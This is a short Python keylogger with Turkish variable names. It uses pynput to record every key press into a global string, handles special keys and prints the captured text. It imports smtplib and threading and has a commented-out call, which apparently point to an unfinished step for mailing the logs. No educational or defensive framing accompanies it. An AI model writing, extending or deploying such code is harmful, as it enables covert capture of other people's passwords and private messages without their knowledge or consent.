import pynput.keyboard
import smtplib
import threading


toplama = " "
def emir(harfler):
    global toplama
    print("========================")
    try:

        toplama += str(harfler.char)
    
    except AttributeError:
        
        if harfler == harfler.space:
            toplama += " "  
        
        elif harfler==harfler.backspace:
            sayi = len(toplama)
            sayi -=1
            print(toplama[sayi])
            deger=0
            sonuc=" "
           
            while sayi>deger:
                sonuc += toplama[deger]
                deger +=1
            toplama = sonuc
        
        elif harfler==harfler.enter:
            toplama += "\n"
        
        elif harfler==harfler.tab:
            toplama += "\t"

        elif harfler==harfler.shift:
            toplama += " "

        else:
            toplama +=str(harfler)
    print(toplama)

dinleme = pynput.keyboard.Listener(on_press=emir)

with dinleme:
#    dallama()
    dinleme.join()


